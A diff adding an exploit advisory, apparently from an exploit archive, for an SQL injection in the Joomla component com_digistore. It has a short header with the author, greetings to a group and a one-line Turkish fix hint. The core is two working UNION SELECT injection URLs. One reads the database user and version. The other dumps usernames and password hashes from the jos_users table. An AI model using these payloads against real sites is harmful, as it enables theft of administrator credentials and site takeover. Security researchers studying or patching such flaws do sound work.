@@ -1,0 +1,28 @@
+<------------------- header data start ------------------- >
+
+#############################################################
+       Joomla Component com_digistore SQL injection Vulnerability                                          
+#############################################################
+
+# author        : Fl0riX
+# Greetz    : BARCOD3 , Septemb0x, Deep-Power,DreamPower,Pyske,F0rtys3v3n,BlackApple
+# Name        : com_digistore
+
+# Bug Type       : SQL Injection
+
+# Infection      : Admin login bilgileri al&#65533;nabilir.
+
+# Demo Vuln.     :
+http://server/index.php?option=com_digistore&controller=digistoreProducts&task=list&cid[]=-2/**/union/**/select/**/user(),user(),user(),version(),user(),user()
+
+# Bug Fix Advice : Zararl&#65533; karakterler filtrelenmelidir.
+
+#############################################################
+
+< ------------------- header data end of ------------------- >
+
+< -- bug code start -- >
+
+path/index.php?option=com_digistore&controller=digistoreProducts&task=list&cid[]=null/**/union/**/select/**/0,1,2,concat(username,0x3a,password),user(),user()/**/from/**/jos_users
+
+< -- bug code end of -- >
